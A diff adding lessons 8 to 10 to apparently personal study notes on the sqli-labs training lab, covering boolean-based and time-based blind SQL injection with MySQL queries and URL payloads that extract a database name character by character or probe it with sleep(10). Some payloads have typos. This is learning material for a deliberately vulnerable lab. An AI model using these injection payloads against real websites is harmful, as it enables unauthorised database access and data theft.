@@ -91,6 +91,35 @@
   * query will be : ?id=2′)) union select 1,2,3 into outfile “/var/www/sqli-labs/Less-7/union2.txt” –+
   * checking the Less-7/union2.txt file after this gives us the data or info as output
 
+## lesson8
+### Blind sqli Boolean-based single quotes
+  *  Injecting some queries we see that we do not have an error message on the screen. 
+  *  We are not sure here that the injection exists on this page or not, that's why this type of injection is called blind injection. 
+  *  There are two types of blind injection, Boolean-based and Time-based injections.
+  *  use security;
+  *  select length(database());
+  *  select substr(database(),1,1); --> substring is a part of the string
+  *  select ascii(substr(database(),1,1)); --> ans:115 (s) (to get the ascii value of the substring)
+  *  select ascii(substr(database(),2,1)); --> ans:101 (e) (like this we can find character one by one)
+  *  select ascii(substr(database(),2,1)) = 101;  --> value returned is true
+  *  select ascii(substr(database(),2,1)) < 101;  --> returns false since ascii value not less than 101
+  *  ?id=1′ AND (ascii(substr((select database()) ,3,3)) = 99 --+  (this query is true, so message like 'you are in ....' is printed)
+  *  for any other invalid value it gives no message as before
+  *  id=1′ AND (ascii(substr((select table_name information_schema.tables where table_schema=database()limit 0,1) ,1,1)) = 101 –+  (message you are in...)
+  *  so 1st letter is e as value is 101, e stands for email
+
+## lesson9 and lesson10
+### Blind sqli Boolean-based single quotes
+  * In this lesson we can't see an error that we have tampered the query, which results in Mysql error. 
+  * So now it makes us check whether SQL injection is possible and we will also use sleep command in mysql.
+  * Query select if((select database()=”security”, sleep(10), null); we get the response 10s after sleep, giving us the result that a database security exists.
+  * This is also known as a time-based SQL query. 
+  * Similarly if we try to run the query select if ((select database()=”securi”, sleep(10), null); 
+  * There is no time-based response from the SQL server which means that such a database does not exist.
+  * Now we do the same thing in our browser query.
+  * We alter the parameter with ?id=1′ and ((select database()=”security”, sleep(10), null);
+  * There is a waiting response from the browser. Since the query was able to detect the database it gives us the response. 
+  * If the database name were incorrect, we would not have got a waiting response.
 
 
 
